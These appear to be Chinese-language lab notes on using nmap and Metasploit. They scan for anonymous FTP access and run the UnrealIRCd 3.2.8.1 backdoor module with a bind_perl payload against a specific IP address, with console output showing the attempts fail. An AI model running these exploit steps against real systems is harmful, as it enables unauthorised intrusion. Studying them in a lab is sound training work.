### 整合nmap & metasploit小試身手
* https://ithelp.ithome.com.tw/articles/10225010
##
### 1. 使用 nmap 的script找 <target-ip> (Windows主機)是否有和 FTP 匿名存取有關的漏洞
* sudo nmap [目標主機] --script=ftp-anon -p 21
* sudo apt-get install ftp
* ftp [目標主機]  (user: anonymous, pass: email-address)
### 2. 找 Unreal 的漏洞 <mIRC Chat (The IRC port is usually 6667)>
* sudo nmap -p 6667 <target ip>
* msfconsole
```
 msf6> search unreal
 msf6> use exploit/unix/irc/unreal_ircd_3281_backdoor
 msf6> exploit(unix/irc/unreal_ircd_3281_backdoor) > show options
 
Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   6667             yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set rhost 140.133.78.164
rhost => 140.133.78.164
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit

[-] 140.133.78.164:6667 - Exploit failed: A payload has not been selected.
[*] Exploit completed, but no session was created.
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload cmd/unix/bind_perl
payload => cmd/unix/bind_perl
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit

[-] 140.133.78.164:6667 - Exploit failed [unreachable]: Rex::ConnectionTimeout The connection with (140.133.78.164:6667) timed out.
[*] Exploit completed, but no session was created.
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > 
```
